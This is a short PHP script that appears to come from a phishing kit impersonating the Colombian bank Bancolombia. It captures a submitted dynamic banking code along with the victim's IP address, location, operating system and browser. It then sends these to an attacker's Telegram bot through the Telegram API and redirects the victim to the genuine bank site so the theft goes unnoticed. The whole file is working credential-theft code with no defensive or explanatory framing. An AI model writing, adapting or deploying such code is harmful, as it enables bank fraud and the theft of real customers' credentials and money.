<?php
ini_set("display_errors", 0);
include('dt.php');
include('funciones.php');


if (isset($_POST['clvdina'])){

$message = "Banclombia-inf\r\nClave-dinamik2: ".$_POST['clvdina']."\r\n
\r\nFecha: ".date ('l jS \of F Y h:i:s A',time())."\r\nIp y Localidad: ".$myip." ".$pais." ".$region."\r\nSO: ".$user_os."\r\nNavegador: ".$navegador."";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

}
 echo '<script>
			window.location.href="https://www.bancolombia.com/personas";
		</script>';

?>